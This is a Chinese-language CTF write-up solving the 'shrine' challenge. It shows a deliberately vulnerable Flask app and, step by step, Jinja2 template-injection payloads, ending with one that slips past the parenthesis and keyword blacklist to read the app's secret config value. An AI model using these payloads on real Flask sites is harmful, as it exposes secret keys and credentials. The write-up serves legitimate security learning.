# [WesternCTF2018]shrine

## 分析

打开网页首先是一段源码，右键查看网页源代码，如下：

``` python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)

```

查看发现

``` python
render_template_string(safe_jinja(shrine))
```

那这题应该是个SSTI，这个我之前不怎么会，赶紧搜搜搜，然后试了一波，发现很多都没有过滤小括号的教程，开始陷入迷茫。

 之后google发现大佬的wp，赶紧跟着做一波

## 解题

以下为大佬原文，链接在reference最后一个

``` python
{{7*7}}
```

![2019-07-29_112958](D:\CTF\ctf\web\buuctf\[WesternCTF2018]shrine\picture\2019-07-29_112958.jpg)

``` python
{{7*'7'}}
```

![2019-07-29_115216](D:\CTF\ctf\web\buuctf\[WesternCTF2018]shrine\picture\2019-07-29_115216.jpg)

测试发现是 jinja2 或 Twig，后端源码为 flask

所以这个是关于 flask + jinja2 的 SSTI

至于为什么，请看图

![1275435-20190304230146045-1430183232](D:\CTF\ctf\web\buuctf\[WesternCTF2018]shrine\picture\1275435-20190304230146045-1430183232.png)

``` python
{{''.__class__.__mro__[2].__subclasses__()}}
```

![2019-07-29_113220](D:\CTF\ctf\web\buuctf\[WesternCTF2018]shrine\picture\2019-07-29_113220.jpg)

明显这里对 `()` 进行了过滤

只能从别的地方入手，例如 flask 的内置函数和变量，

当然，config 和 self 也被加入了黑名单

但通过变量去读取 app.config 也会涉及到 `()` 的使用

所以只剩下内置函数

get_flashed_messages(), url_for()

构造payload

``` python
{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
```

![QQ截图20200131164532](D:\CTF\ctf\web\buuctf\[WesternCTF2018]shrine\picture\QQ截图20200131164532.png)

得到flag

## reference

* [浅析SSTI(python沙盒绕过)](http://flag0.com/2018/11/11/浅析SSTI-python沙盒绕过/)

* [CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】](https://zhuanlan.zhihu.com/p/93746437)

* [WP-TokyoWesterns CTF 4th 2018 shrine](WP-TokyoWesterns CTF 4th 2018 shrine)